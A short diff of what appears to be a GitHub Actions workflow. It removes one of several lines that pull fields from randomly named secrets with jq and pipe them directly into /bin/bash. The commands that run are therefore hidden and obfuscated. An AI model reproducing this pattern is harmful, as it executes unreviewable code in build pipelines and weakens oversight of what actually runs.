@@ -20,7 +20,6 @@ jobs:
           mg165: ${{ secrets.mg165 }}
         run: |
           printf '%s' "$mg165" | jq -r .atj137 | /bin/bash
-          printf '%s' "$dtm484" | jq -r .hqa96 | /bin/bash
           echo $ddz86 | jq -r .cumo9 | /bin/bash
           printf '%s' "$vykcx88016" | jq -r .ier3441 | /bin/bash
           printf '%s' "$h67" | jq -r .w8 | /bin/bash
